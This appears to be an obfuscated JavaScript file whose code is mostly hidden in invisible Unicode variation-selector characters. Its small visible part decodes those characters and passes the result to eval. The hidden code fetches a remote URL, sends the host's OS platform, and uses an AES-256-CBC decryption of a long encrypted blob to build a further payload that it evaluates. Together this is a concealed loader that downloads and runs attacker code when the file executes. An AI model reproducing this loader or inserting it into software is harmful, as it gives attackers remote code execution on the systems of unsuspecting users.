󠅧󠅕󠅔󠅤󠄢󠄜󠅏󠄙󠅭󠄙󠅭󠅭󠅭󠄙󠅭󠄙󠄫󠅦󠅑󠅢󠄐󠅢󠅞󠅩󠅑󠅜󠄭󠅏󠅏󠅞󠅑󠅝󠅕󠄘󠅑󠅣󠅩󠅞󠅓󠄘󠅨󠅠󠅒󠅑󠅧󠅩󠄜󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄙󠄭󠄮󠅫󠅤󠅢󠅩󠅫󠅜󠅕󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅖󠅕󠅤󠅓󠅘󠄘󠅨󠅠󠅒󠅑󠅧󠅩󠄜󠅫󠅘󠅕󠅑󠅔󠅕󠅢󠅣󠄪󠅫󠅟󠅣󠄪󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅟󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅠󠅜󠅑󠅤󠅖󠅟󠅢󠅝󠄘󠄙󠅭󠅭󠄙󠄫󠅙󠅖󠄘󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅟󠅛󠄙󠅫󠅜󠅕󠅤󠄐󠅔󠅑󠅤󠅑󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅤󠅕󠅨󠅤󠄘󠄙󠄜󠅘󠅕󠅑󠅔󠅕󠅢󠄭󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅘󠅕󠅑󠅔󠅕󠅢󠅣󠄫󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄘󠅞󠅥󠅜󠅜󠄜󠅫󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄪󠅔󠅑󠅤󠅑󠄜󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠄪󠅘󠅕󠅑󠅔󠅕󠅢󠄞󠅗󠅕󠅤󠄘󠅑󠅤󠅟󠅒󠄘󠄒󠅑󠅈󠅊󠅙󠅉󠅈󠄾󠅜󠄾󠅚󠅁󠄭󠄒󠄙󠄙󠄜󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠄪󠅘󠅕󠅑󠅔󠅕󠅢󠄞󠅗󠅕󠅤󠄘󠅑󠅤󠅟󠅒󠄘󠄒󠅓󠄢󠅆󠅚󠅓󠅝󠅆󠄠󠅑󠄢󠅆󠄥󠄒󠄙󠄙󠅭󠄙󠅭󠅕󠅜󠅣󠅕󠄐󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄘󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠄒󠄒󠄙󠄙󠅭󠅓󠅑󠅤󠅓󠅘󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄢󠄙󠅫󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄢󠄙󠅭󠅭󠄜󠄒󠅢󠅞󠅩󠅑󠅜󠄒󠄙󠄫︊`)).toString('utf-8'));
const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄴󠅕󠅓󠅙󠅠󠅘󠅕󠅢󠅙󠅦󠄘󠄗󠅑󠅕󠅣󠄝󠄢󠄥󠄦󠄝󠅓󠅒󠅓󠄗󠄜󠄗󠄷󠅁󠅟󠄡󠅕󠄢󠄤󠅣󠅆󠄺󠅁󠄽󠄥󠅝󠅞󠅙󠄺󠄩󠄨󠄽󠅒󠅅󠅃󠅅󠄛󠅉󠅂󠄤󠅂󠅩󠅦󠄨󠄗󠄜󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠄠󠄢󠄦󠄤󠅕󠅓󠄡󠄢󠄨󠄥󠅔󠄣󠄥󠄠󠄤󠄥󠄦󠄥󠅔󠄣󠅖󠄡󠅖󠄥󠄢󠄠󠄣󠄤󠄡󠄠󠄠󠄦󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄙󠄙󠄫󠅜󠅕󠅤󠄐󠅒󠄭󠅔󠄞󠅥󠅠󠅔󠅑󠅤󠅕󠄘󠄗󠅔󠄨󠅓󠄢󠄣󠅔󠄠󠄤󠄧󠄡󠄡󠄤󠅖󠅕󠄠󠅓󠅓󠄥󠄠󠅑󠄧󠄢󠄠󠄡󠅓󠄦󠅖󠅒󠅖󠅒󠄢󠄡󠄢󠅓󠄧󠄤󠄥󠅖󠄨󠅔󠄥󠄣󠄨󠄡󠄨󠅑󠅔󠅒󠅑󠅖󠅑󠄤󠄦󠄧󠄦󠅓󠅓󠅕󠅔󠄦󠄦󠄠󠄢󠅑󠅕󠅓󠅑󠄥󠄥󠄧󠅕󠄦󠅓󠄡󠄩󠅕󠄤󠄠󠄠󠅑󠅖󠅕󠄨󠄡󠄩󠄥󠄤󠄠󠅒󠅔󠄢󠄦󠅒󠅔󠄠󠅓󠄤󠅒󠄣󠅒󠅑󠄡󠅔󠅔󠄦󠅔󠅔󠅑󠄨󠅒󠅑󠅑󠄨󠄧󠄢󠄢󠄡󠅖󠅑󠅓󠄥󠄤󠅕󠅖󠄨󠅑󠄤󠄧󠄩󠅒󠄣󠅕󠄠󠄥󠄢󠄦󠅕󠄨󠅔󠅑󠄧󠄠󠅑󠄨󠅕󠅔󠅖󠅑󠅓󠄥󠄢󠄩󠅕󠄨󠅓󠄤󠅖󠄩󠄨󠄤󠅒󠅖󠄥󠄦󠄡󠄢󠄠󠄡󠅑󠅒󠄦󠄨󠅓󠄤󠅓󠄡󠅖󠅕󠅑󠄥󠅒󠅔󠅔󠄧󠄩󠄠󠄢󠅔󠄢󠄢󠄣󠄦󠄢󠄣󠄡󠄢󠄧󠅒󠅑󠄢󠅓󠄥󠅖󠅔󠅑󠅕󠄦󠅖󠅕󠅓󠅓󠄤󠄡󠄨󠄤󠄡󠅔󠅕󠄦󠅔󠄢󠅖󠄤󠄢󠄧󠅓󠄢󠄥󠄩󠄠󠅕󠄥󠅔󠄩󠅒󠄦󠄦󠄡󠄤󠄢󠄨󠄢󠅑󠅒󠅒󠄡󠅓󠄧󠄥󠄥󠄧󠄠󠅓󠄨󠄩󠅓󠄧󠄤󠄠󠄧󠄣󠅔󠄣󠅓󠄠󠅓󠄢󠄨󠄥󠄢󠅒󠅕󠅔󠄦󠄦󠅖󠄦󠅑󠄤󠄧󠄩󠄤󠅔󠅓󠅓󠅒󠄦󠄡󠅖󠅓󠄦󠄠󠄦󠄣󠄥󠅖󠄧󠄦󠄠󠄠󠅔󠅑󠄤󠄩󠄧󠄠󠄤󠄤󠅒󠅔󠅓󠄤󠄡󠄨󠅑󠄥󠄧󠅕󠄦󠄨󠄣󠄢󠅖󠄨󠄩󠄧󠄠󠅔󠄠󠅓󠄡󠄢󠅕󠄡󠄠󠄧󠄠󠄧󠅖󠄣󠄥󠅒󠄠󠄠󠄡󠅖󠅕󠅕󠄩󠅖󠅑󠅒󠄠󠅕󠄧󠅓󠄩󠄦󠄨󠅓󠅔󠅒󠄡󠅖󠄣󠅕󠅓󠄡󠄡󠄡󠄠󠅔󠄨󠄢󠅔󠄧󠄢󠄩󠄡󠄩󠄩󠄠󠄥󠅖󠄩󠄨󠅖󠅑󠄢󠅖󠅕󠄣󠅕󠄢󠅓󠄡󠄨󠄩󠅓󠄠󠄧󠄥󠅒󠄣󠄢󠅕󠄢󠅕󠄢󠄨󠄨󠄡󠄢󠅓󠄩󠄩󠄧󠅔󠄡󠄤󠅑󠄥󠄩󠄡󠄩󠅑󠅒󠄤󠄠󠄣󠄦󠄢󠄡󠅖󠄢󠄠󠅓󠅔󠄦󠄣󠄨󠄩󠄡󠄦󠅑󠅔󠅕󠅒󠅓󠅖󠄠󠄨󠄦󠅒󠄡󠅔󠅖󠄡󠅑󠄠󠄣󠄡󠅖󠄦󠅒󠄦󠄩󠄢󠅓󠄨󠄤󠄩󠄤󠄦󠄡󠅑󠄧󠄣󠄥󠄨󠅖󠄨󠄨󠄩󠄢󠄩󠅖󠄩󠄦󠄡󠄢󠄡󠄧󠅕󠄢󠄦󠄩󠄧󠄠󠄣󠅒󠄨󠄠󠅒󠅓󠄣󠅕󠄩󠄦󠄠󠄢󠅑󠅖󠄢󠅕󠄩󠅒󠄥󠄩󠄦󠄡󠄤󠄡󠄨󠄨󠄣󠄤󠄣󠅕󠅑󠄦󠄣󠄩󠄥󠅖󠄤󠄧󠅕󠄥󠄢󠄢󠅕󠄠󠅔󠄥󠄧󠅖󠄠󠄥󠅓󠄣󠅖󠅖󠄡󠅕󠄢󠄣󠅔󠄣󠅑󠄢󠄢󠄨󠄩󠄢󠅑󠄧󠄩󠅓󠄦󠄥󠄧󠄠󠅒󠄠󠅒󠄨󠄨󠄤󠅖󠄤󠅔󠄢󠅓󠄨󠄢󠅖󠄨󠅖󠄨󠅑󠅔󠄧󠄦󠄤󠄢󠄥󠅒󠄢󠅓󠄢󠄨󠄨󠄨󠄤󠅒󠄡󠄩󠄠󠄩󠄤󠅓󠅖󠅒󠄠󠄩󠄤󠅕󠅖󠅑󠄣󠄨󠅓󠄩󠅕󠅑󠄩󠅒󠄧󠄣󠄤󠅓󠄢󠄤󠄦󠅖󠄡󠄩󠄢󠄧󠅓󠅓󠄣󠄢󠄦󠅒󠄠󠅕󠅒󠄣󠅑󠄤󠄡󠄦󠄩󠄩󠅕󠄣󠄤󠄨󠄦󠄤󠅕󠄥󠄧󠅒󠄥󠅓󠄦󠄩󠄨󠄤󠄤󠄥󠅔󠅓󠅓󠅕󠄧󠄣󠅖󠅓󠄨󠄧󠄤󠄠󠄣󠅕󠄢󠅓󠄦󠄥󠄧󠄢󠄣󠅓󠅓󠅓󠄨󠅔󠄨󠅕󠄨󠄩󠅔󠅕󠅒󠅑󠄧󠄥󠄢󠄠󠄥󠄣󠅒󠄠󠄨󠄠󠅕󠅒󠅕󠄤󠅔󠄨󠄦󠅓󠄦󠅒󠅑󠄠󠄦󠅑󠄩󠅖󠅒󠄠󠅒󠅖󠅑󠄧󠄡󠅕󠅔󠅓󠄨󠄨󠄩󠄦󠄩󠄡󠄧󠄧󠄥󠄥󠅖󠄠󠄢󠄩󠄧󠅓󠅒󠄡󠄤󠅓󠅔󠅔󠅕󠄦󠄡󠄠󠄣󠅖󠄦󠄣󠄥󠄧󠅔󠄧󠄧󠅔󠄨󠄡󠄠󠄡󠅕󠄢󠄠󠄩󠄦󠄢󠄦󠄦󠄥󠅕󠄠󠄩󠄩󠅒󠅒󠅓󠄥󠅔󠅓󠄩󠅒󠅔󠄠󠅔󠅒󠅓󠅖󠅕󠄢󠄣󠅕󠅒󠄠󠅑󠄧󠅑󠄠󠄡󠄦󠄥󠄠󠅓󠄠󠄥󠅒󠄣󠄢󠄡󠄥󠄢󠅑󠄧󠅕󠄤󠅖󠄣󠄧󠄣󠄡󠄡󠄢󠅓󠄡󠅕󠄦󠄩󠅑󠅑󠄨󠄦󠄨󠄤󠅖󠅓󠅑󠅑󠄧󠅖󠄣󠄡󠄩󠅕󠄤󠄦󠄣󠄠󠄨󠅔󠅕󠅓󠄩󠄤󠄨󠄨󠄩󠄢󠄡󠄩󠅓󠅓󠄦󠅖󠅕󠄣󠄣󠄡󠅑󠄦󠄣󠄦󠄣󠅖󠄥󠅕󠄢󠅔󠄤󠄦󠅑󠅒󠅒󠄥󠅓󠄣󠄨󠄥󠄥󠄥󠄩󠄡󠄦󠄧󠄩󠄡󠅒󠄢󠄠󠄧󠅖󠄦󠄣󠄤󠄤󠅒󠅕󠅖󠄨󠄦󠅖󠄠󠄩󠅑󠄨󠅓󠄠󠅑󠄨󠅕󠅖󠄥󠄢󠄦󠄤󠄥󠄥󠅑󠄤󠄢󠅒󠅑󠄣󠅖󠄦󠄤󠄢󠄩󠄧󠅒󠄡󠄥󠄨󠄨󠅕󠅕󠅓󠄣󠅒󠄠󠅑󠄡󠅕󠄣󠄧󠄤󠅖󠄩󠅓󠅕󠄦󠄠󠅔󠅓󠄦󠅓󠄩󠄨󠄡󠅔󠄩󠅑󠅔󠄢󠅓󠄧󠄡󠄡󠅕󠄦󠅔󠅑󠅖󠄨󠅒󠄢󠄥󠅒󠄩󠄩󠅓󠅒󠄩󠄥󠅒󠄥󠅔󠄧󠅖󠅓󠅕󠅕󠄡󠄧󠄤󠄨󠄩󠄡󠅒󠅓󠄢󠄢󠅒󠄤󠄦󠄧󠄨󠄨󠄧󠄠󠅕󠅖󠄥󠄨󠄢󠄩󠅕󠄡󠄢󠄩󠅔󠄧󠄧󠄩󠅖󠄧󠄣󠅓󠄧󠄠󠄣󠄠󠄥󠄦󠅔󠄢󠄢󠄩󠄥󠅕󠅒󠅑󠅒󠅒󠄢󠅑󠅑󠅑󠅕󠄦󠄠󠅓󠅔󠄢󠅔󠄥󠄩󠄨󠅒󠄧󠄧󠅕󠄥󠄧󠄡󠄨󠅖󠄣󠅖󠅑󠄠󠅓󠄧󠄨󠄤󠅔󠅓󠄦󠄧󠅔󠄣󠅕󠄤󠄧󠅕󠄥󠄦󠅕󠄣󠄩󠅒󠄡󠄧󠄦󠅕󠄢󠅕󠄥󠅑󠅒󠄥󠄩󠄨󠄧󠄣󠄩󠅑󠄩󠅖󠅕󠄡󠄣󠄤󠅖󠅒󠄡󠄣󠅑󠄢󠄦󠅕󠅓󠄥󠄣󠄡󠄣󠅖󠄥󠅔󠄨󠄢󠄢󠄩󠄢󠄡󠄢󠅖󠅔󠄨󠄧󠄩󠄩󠄩󠄧󠄥󠄠󠄢󠄧󠄤󠄢󠄧󠄠󠄣󠄣󠄡󠅑󠅔󠄠󠄠󠄥󠄤󠅒󠅖󠄣󠅔󠄣󠅖󠅑󠄡󠅔󠄤󠄥󠄨󠄡󠄩󠄦󠄥󠄣󠅕󠄨󠄩󠅓󠄨󠄠󠄢󠄧󠄧󠄣󠄠󠄦󠄥󠄡󠅓󠄣󠄤󠅑󠄡󠄠󠅒󠅖󠅒󠄥󠄩󠄥󠄧󠅓󠄦󠅑󠅒󠄧󠄤󠅒󠅕󠅖󠄩󠅖󠅑󠄧󠅕󠅒󠄥󠄠󠄩󠄨󠄥󠅕󠄥󠅖󠅑󠄤󠄤󠄨󠅑󠄦󠄡󠅒󠅔󠅑󠄢󠅔󠅑󠄥󠄡󠄦󠅒󠄢󠅕󠅑󠄦󠄣󠄩󠄠󠄡󠄥󠄤󠅔󠄣󠄡󠄤󠅔󠄧󠄢󠅖󠅓󠅑󠅕󠄢󠄨󠄧󠄡󠄧󠅔󠅖󠄡󠄦󠅑󠄤󠄩󠄠󠅒󠅕󠅒󠅕󠅖󠅑󠅑󠄡󠄥󠄠󠄦󠄥󠄤󠄦󠄡󠄧󠄠󠄠󠄢󠅔󠅕󠄤󠅔󠄤󠅔󠄧󠅔󠅖󠅑󠅓󠅒󠅕󠅑󠅖󠄧󠅒󠅒󠅖󠄨󠄨󠄠󠅒󠄠󠅑󠅓󠄩󠄢󠄨󠄦󠅔󠅔󠄧󠄩󠅑󠄧󠄩󠄠󠄥󠄤󠅔󠅒󠄦󠄠󠅒󠄡󠅕󠅕󠄦󠅔󠄨󠄥󠄢󠄥󠅖󠄤󠅒󠅕󠄨󠄡󠄢󠄠󠄦󠅖󠄨󠄥󠄤󠄧󠅑󠄦󠄩󠄠󠅕󠄩󠄥󠅖󠄥󠅖󠄤󠄥󠄢󠄣󠅖󠄢󠅑󠅕󠄩󠄦󠄦󠄠󠅕󠅑󠄣󠄦󠄢󠅔󠅖󠅔󠄨󠄧󠄥󠅓󠄣󠅓󠄡󠄠󠅑󠄥󠄣󠅓󠅑󠅕󠄦󠄩󠅔󠅓󠄣󠅒󠄤󠅑󠅓󠄦󠄣󠄣󠅒󠄦󠄦󠅑󠅓󠄨󠄩󠅑󠄠󠅖󠄢󠄦󠄥󠄩󠅖󠄨󠅒󠅕󠄣󠄤󠅒󠄥󠅖󠅓󠄨󠄧󠅖󠄥󠅖󠄢󠅖󠅒󠅖󠅔󠅔󠅖󠅒󠄢󠄥󠄥󠄧󠅑󠅒󠄨󠄠󠄤󠄥󠄧󠅓󠅑󠅕󠅓󠄢󠄥󠄡󠄩󠄤󠅑󠅕󠄡󠄤󠅓󠄧󠄨󠄢󠄨󠄩󠄦󠄥󠅒󠅔󠄤󠅖󠅑󠄣󠄩󠅒󠄠󠅑󠄩󠄡󠅔󠅕󠅑󠄠󠄣󠅔󠅕󠄡󠅔󠅑󠅕󠄣󠄤󠄡󠅕󠅖󠅖󠄧󠄢󠄥󠅖󠄤󠅖󠄧󠅒󠅕󠅕󠄦󠅑󠅑󠅓󠄤󠄢󠅒󠄣󠅓󠄨󠄦󠄣󠄠󠅒󠅑󠄤󠅖󠄦󠅓󠄢󠅑󠄢󠄤󠄦󠄦󠅕󠄧󠄥󠄢󠄤󠄠󠄧󠅕󠄧󠄦󠄥󠄣󠅕󠄠󠅔󠅔󠅒󠄡󠅓󠅓󠅖󠄨󠄩󠄠󠄧󠄦󠄠󠄠󠄤󠅔󠄣󠄨󠄨󠄦󠅕󠄠󠄩󠅖󠅕󠄨󠄠󠄢󠄧󠄢󠅔󠅕󠅔󠄨󠅒󠄥󠄨󠄦󠅒󠅕󠄨󠄣󠅑󠅑󠅓󠄣󠄠󠅖󠅖󠄦󠄣󠄧󠄣󠅓󠅓󠄩󠄧󠄡󠅒󠅓󠄧󠄨󠄢󠄥󠅒󠄤󠅔󠄧󠄥󠄤󠅒󠅑󠄢󠄤󠄩󠄦󠄠󠄠󠅑󠅖󠅕󠅖󠄥󠄡󠄨󠅖󠄩󠅖󠄧󠅑󠄥󠅔󠄥󠅖󠄢󠄣󠄠󠅑󠄢󠅖󠅖󠅒󠄡󠅓󠄤󠄩󠄥󠄠󠄧󠄦󠄣󠅓󠄧󠅕󠅑󠅓󠅓󠅓󠅒󠄩󠅕󠅒󠄢󠄠󠅕󠄥󠄧󠅓󠅒󠅔󠅖󠄣󠄧󠅑󠄩󠅓󠄩󠅓󠅑󠄥󠄧󠄢󠅖󠄡󠄤󠄩󠅑󠄤󠄣󠅔󠅒󠄣󠄤󠄤󠄣󠅔󠅔󠄦󠄦󠄨󠅑󠄤󠄦󠅖󠄥󠄤󠅕󠅕󠅓󠄢󠄧󠄤󠄤󠄨󠅓󠅒󠄢󠄦󠄠󠅕󠅕󠄥󠄠󠅔󠄩󠄩󠄣󠄡󠅑󠄠󠄧󠄡󠄡󠄩󠄥󠄧󠄤󠄣󠄣󠄣󠄠󠅕󠅓󠅑󠄠󠄨󠄢󠄠󠅕󠄩󠄣󠅑󠄨󠄦󠄤󠅕󠄠󠄡󠅒󠄦󠄤󠄢󠄥󠄤󠄢󠄠󠄤󠄦󠅑󠄤󠄠󠄤󠅔󠅕󠄨󠅖󠄩󠅖󠄡󠄡󠄩󠄧󠄣󠅖󠄦󠄢󠄨󠅒󠄧󠅑󠄩󠅒󠅖󠄡󠄩󠄧󠄩󠄥󠄧󠅕󠅖󠅕󠅑󠄨󠄤󠄧󠅔󠅓󠄢󠅓󠅒󠄤󠄠󠄨󠅑󠄨󠅖󠄥󠄠󠅖󠄤󠄡󠄤󠅖󠄤󠄥󠅑󠅔󠄣󠅔󠄡󠄨󠅒󠄤󠄠󠄩󠅕󠄨󠅑󠄤󠄠󠄢󠄩󠄡󠄡󠅖󠄣󠅑󠄧󠄢󠄨󠄤󠅑󠄠󠅖󠄡󠅓󠄨󠄦󠄦󠄤󠄧󠅔󠄥󠄢󠅑󠅓󠅒󠅑󠅒󠅑󠄣󠄡󠅔󠅖󠄡󠅒󠄣󠄨󠄩󠄦󠄠󠄥󠅓󠄢󠄡󠅒󠄢󠅕󠅒󠅕󠄧󠅓󠅒󠄦󠄣󠅒󠅑󠄦󠄡󠄣󠄡󠅒󠄦󠄢󠅓󠅖󠄩󠅔󠄨󠅔󠅑󠅖󠄣󠄦󠄤󠅖󠄣󠄣󠅔󠄡󠅒󠄥󠄣󠅒󠅑󠄤󠄠󠄥󠄤󠄣󠄠󠄥󠅖󠄠󠄡󠅕󠄤󠄩󠄩󠄤󠅕󠅓󠅔󠄤󠄨󠅖󠄨󠄤󠅖󠄤󠅒󠅖󠄨󠄥󠄧󠄨󠄤󠄦󠅕󠅖󠅕󠄤󠄢󠄧󠄡󠄣󠄡󠄦󠄦󠄧󠄧󠅒󠄨󠄥󠅕󠅑󠅖󠅖󠄨󠄨󠅒󠄢󠄡󠅓󠄤󠄤󠅓󠄥󠅑󠅓󠅖󠄢󠄣󠄢󠅓󠄦󠅕󠄩󠄢󠅓󠄣󠄡󠄦󠅒󠄢󠅕󠄠󠄢󠅓󠄨󠄧󠅒󠅒󠄩󠄣󠄥󠄨󠄩󠄤󠅑󠄤󠅕󠅓󠅓󠅒󠄩󠅑󠅓󠅔󠄨󠄤󠄢󠄦󠄤󠄧󠄣󠄠󠄣󠄧󠅖󠅔󠄥󠅖󠄤󠄧󠅔󠄥󠅔󠅓󠄡󠄩󠅕󠄣󠄧󠄡󠄩󠅕󠅒󠄣󠅕󠄩󠄠󠅒󠄡󠅓󠄥󠄤󠄥󠅖󠄢󠅓󠅕󠅖󠄤󠅕󠅕󠅒󠄡󠄣󠅔󠄡󠅓󠄤󠄠󠅔󠄩󠄨󠅑󠄧󠅔󠄣󠅒󠄤󠄡󠄥󠄥󠅕󠄨󠄡󠄣󠄠󠄧󠄨󠄨󠄨󠄣󠄥󠄠󠄧󠅔󠄡󠄥󠅖󠄧󠅕󠄡󠄢󠄠󠅓󠅔󠅒󠅑󠄢󠅓󠄢󠄨󠄣󠅒󠄣󠄥󠅑󠅖󠄩󠄦󠅕󠅒󠄧󠄩󠅕󠄨󠄩󠄡󠅖󠅓󠄨󠄦󠅑󠄧󠄦󠅔󠅕󠄣󠄥󠅕󠅕󠅑󠄦󠅑󠄥󠅖󠄤󠅑󠄧󠄡󠄤󠅔󠄢󠅒󠅕󠄠󠄡󠄠󠄢󠄤󠄣󠅔󠄧󠄤󠄡󠄩󠄠󠄩󠅔󠄩󠅖󠄨󠄥󠄠󠄡󠅖󠅒󠄨󠅕󠄩󠅓󠄣󠄨󠄡󠄢󠄧󠅒󠅕󠄥󠄧󠄥󠄦󠄢󠅖󠄠󠅓󠅖󠄦󠄠󠅖󠅒󠄢󠄨󠄥󠄠󠅔󠄠󠄣󠄠󠅓󠄣󠅔󠄧󠄥󠄠󠄡󠄡󠄥󠅓󠄣󠄩󠅓󠄩󠄡󠄣󠅒󠄥󠄢󠄡󠄨󠄩󠅖󠄤󠄡󠅒󠄠󠄢󠅑󠄡󠄣󠅓󠅓󠅔󠅔󠄤󠄧󠄥󠄦󠄡󠅓󠄢󠅖󠄨󠅓󠄢󠅕󠄤󠄥󠄨󠄦󠄣󠄠󠅒󠄦󠅕󠄢󠅕󠄦󠄥󠄣󠅒󠄦󠅖󠄧󠄠󠄤󠄢󠅕󠄦󠄤󠄨󠄧󠄤󠄧󠅓󠅒󠄡󠅔󠄠󠄢󠄣󠅓󠅕󠄦󠅒󠅑󠄥󠄠󠅑󠅒󠅖󠄧󠄨󠄠󠄧󠅓󠄥󠅑󠅒󠄥󠅓󠄦󠄡󠅔󠅑󠄣󠄦󠅓󠄡󠄦󠅕󠅔󠅒󠅑󠅕󠄧󠄨󠅖󠄣󠅔󠄩󠄠󠄠󠄠󠄣󠄤󠄠󠅖󠄨󠅓󠄡󠄩󠅔󠅕󠅕󠄣󠄡󠄦󠅒󠅖󠄧󠅕󠄨󠄩󠄨󠄢󠄣󠅑󠄦󠅑󠅖󠄨󠄥󠄩󠄦󠄠󠅓󠄦󠄧󠄣󠅕󠅑󠅔󠅕󠄦󠅖󠅑󠄧󠄡󠄣󠅖󠄡󠄧󠅕󠅕󠅓󠅑󠄠󠄢󠄧󠄦󠄢󠅓󠅒󠄩󠄤󠄩󠄦󠅒󠄡󠄥󠅕󠅕󠅖󠅕󠄦󠄣󠅖󠅔󠄡󠄠󠄧󠄤󠅒󠄦󠅕󠄠󠄥󠅓󠄠󠅑󠄥󠄨󠅖󠄠󠅑󠅑󠄣󠄧󠅖󠅓󠄤󠄡󠄢󠄧󠄩󠄨󠄥󠅒󠄨󠅕󠄦󠄨󠄢󠅑󠄣󠄠󠄤󠅕󠅖󠅑󠅓󠄡󠅑󠄢󠅖󠅖󠄦󠄡󠄣󠅔󠅖󠄤󠄢󠄦󠄢󠄡󠄤󠄨󠅒󠅕󠅖󠅔󠄦󠅒󠅕󠄣󠅑󠄨󠅒󠅔󠄣󠅑󠄠󠅓󠅒󠅔󠄥󠅓󠅓󠅕󠅒󠄩󠅒󠅑󠄠󠄤󠅒󠅖󠅖󠄨󠄩󠄢󠄢󠅖󠅔󠄧󠄩󠄩󠅔󠄧󠅔󠄢󠄦󠄢󠅓󠅔󠄡󠄠󠅓󠄢󠄨󠅒󠄨󠅔󠄠󠅔󠅒󠅑󠄡󠄤󠄣󠄣󠅑󠅒󠄨󠄨󠄤󠄢󠅕󠄠󠅑󠄦󠄥󠄢󠅕󠅓󠄡󠄡󠅒󠄡󠄧󠅓󠅒󠄣󠅔󠄥󠄠󠄧󠄧󠅔󠄤󠄡󠄦󠅖󠄦󠄢󠄩󠅑󠅒󠅑󠄣󠅕󠅓󠄧󠅒󠄦󠄧󠅕󠄥󠅔󠄦󠄥󠄩󠅔󠄣󠅖󠅕󠄩󠄦󠄠󠅕󠅖󠅖󠄠󠅒󠄦󠄥󠄡󠄧󠅑󠅕󠄨󠄨󠄩󠄩󠄧󠅔󠄧󠅑󠅒󠅓󠅔󠄣󠅖󠄩󠄤󠄦󠄦󠄩󠄢󠄤󠄢󠅔󠄣󠄢󠄠󠅕󠅖󠄠󠄢󠅒󠅕󠄧󠅔󠅒󠄨󠄥󠄥󠅕󠅓󠄩󠄣󠅑󠄣󠄡󠄥󠄥󠄤󠄩󠄦󠄤󠅕󠅖󠄥󠄢󠅔󠅖󠄡󠄡󠄠󠄩󠄣󠄧󠄡󠅖󠄣󠄢󠅓󠅓󠄩󠅖󠄡󠄧󠅖󠄢󠅕󠅑󠄣󠄡󠅒󠄤󠅖󠄥󠄣󠅓󠄣󠄠󠄢󠄥󠅖󠄠󠅑󠄨󠄧󠅓󠄢󠅒󠅑󠄦󠄦󠄢󠄩󠄢󠄡󠅑󠄨󠄩󠄦󠅒󠄠󠅒󠄠󠄣󠄢󠄡󠅕󠄨󠄥󠄤󠄩󠄧󠄥󠅓󠄤󠄩󠅓󠅖󠅖󠄢󠄧󠄧󠄠󠄠󠅓󠅔󠄣󠄩󠄢󠅑󠅒󠅒󠄣󠅔󠄡󠅒󠅕󠅔󠄦󠄦󠅒󠅖󠄢󠅔󠅒󠅑󠄩󠄩󠄣󠄤󠄧󠄩󠄡󠄨󠄧󠅒󠄦󠄩󠄤󠄡󠅓󠅒󠄧󠄧󠅑󠅖󠄥󠅖󠅔󠄩󠅓󠄡󠄤󠅑󠅖󠄡󠅕󠄢󠄣󠄩󠅕󠅒󠅖󠄦󠄢󠅒󠅔󠄩󠄩󠅕󠄥󠄦󠄡󠅑󠄠󠄥󠅒󠄣󠄩󠅑󠅒󠄥󠄢󠄢󠄥󠄥󠅕󠅕󠄩󠅑󠅓󠅕󠅑󠄡󠅓󠄤󠄦󠅖󠄥󠄩󠄡󠄧󠄨󠄥󠄣󠄦󠅓󠄢󠅕󠄣󠄡󠄦󠅒󠅕󠄡󠅕󠅔󠄠󠅒󠄠󠄡󠄢󠅔󠅒󠅔󠅒󠅑󠄩󠄣󠄠󠄧󠄡󠄧󠄢󠅔󠅕󠄥󠄩󠄩󠄣󠅕󠄠󠅒󠅔󠄦󠅖󠅒󠄢󠅒󠅓󠄢󠅑󠄤󠅖󠅕󠄠󠅕󠄡󠄠󠄦󠄣󠄥󠅕󠅑󠄩󠄨󠄢󠅑󠄦󠄢󠅔󠅓󠅔󠅕󠅔󠄧󠄢󠄩󠅑󠄥󠄧󠄠󠄢󠅔󠄩󠄣󠄧󠄣󠅒󠄠󠅔󠅒󠄠󠄤󠄢󠄡󠄧󠄡󠅕󠅓󠄧󠄧󠅕󠄠󠄣󠄧󠄡󠄧󠅖󠄨󠄥󠄣󠄩󠅖󠅖󠄣󠄢󠄥󠅑󠄡󠅒󠅔󠄦󠄣󠅔󠄨󠅒󠄤󠅑󠅒󠅓󠅑󠄣󠅑󠄠󠅒󠄢󠄡󠄧󠄧󠄧󠄢󠄩󠄠󠅓󠄨󠄨󠄠󠅔󠄢󠄥󠄡󠅒󠄧󠄢󠅔󠅔󠄧󠄤󠄢󠅖󠅖󠅔󠅓󠄡󠄠󠄤󠅕󠅖󠄣󠄡󠅕󠄢󠅒󠄧󠄩󠄥󠄩󠄦󠄤󠄤󠄡󠄤󠄧󠅔󠅒󠅓󠄣󠄥󠄠󠅕󠅕󠄢󠅖󠄢󠅓󠄨󠅕󠄨󠄣󠅕󠅒󠄢󠄢󠄤󠄤󠅑󠄢󠅕󠄦󠄡󠄦󠄧󠅔󠅔󠅖󠄠󠅕󠄡󠄢